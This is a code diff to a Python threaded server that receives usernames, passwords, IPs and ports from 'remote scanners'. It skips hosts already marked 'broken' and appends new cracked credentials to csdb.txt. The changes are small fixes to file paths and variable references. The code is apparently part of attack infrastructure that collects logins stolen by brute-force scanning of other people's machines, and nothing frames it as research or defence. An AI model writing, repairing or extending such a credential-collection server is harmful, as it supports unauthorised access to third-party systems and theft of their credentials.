@@ -29,18 +29,18 @@ class ClientThread(Thread):
         data = str(data, 'utf-8', 'ignore')
         if data.split(relay_ps)[0] == "!":
             truecolors.print_info(
-                "Received connection -> " + ip + ":" + str(port))
+                "Received connection -> " + self.ip + ":" + str(self.port))
             truecolors.print_info(
                 "Remote scanner (%s:%s) is sending data.." % (self.ip, str(self.port)))
             while True:
                 try:
                     usr, psw, ip, port = data.split(relay_ps)[1], data.split(relay_ps)[2], data.split(relay_ps)[3], data.split(relay_ps)[4]
-                    if ip in open(os.path.dirname(os.path.realpath(__file__))+r"\dump\csdb.txt").read():
+                    if ip in open("csdb.txt").read():
                         truecolors.print_errn(f"Ip: {ip} already broken, continuing ..." )
                         break
                     else:
-                        with open(os.path.dirname(os.path.realpath(__file__))+r"\dump\csdb.txt", "a") as f:
-                            f.write(f"{usr}:{psw}:{ip}:{port}")
+                        with open("csdb.txt", "a") as f:
+                            f.write(f"{usr}:{psw}:{ip}:{port}\n")
                             truecolors.print_succ("Remote scanner (%s:%s) stored new credentials!" % (self.ip, str(self.port)))
                             break
                 except Exception as e:  # in use
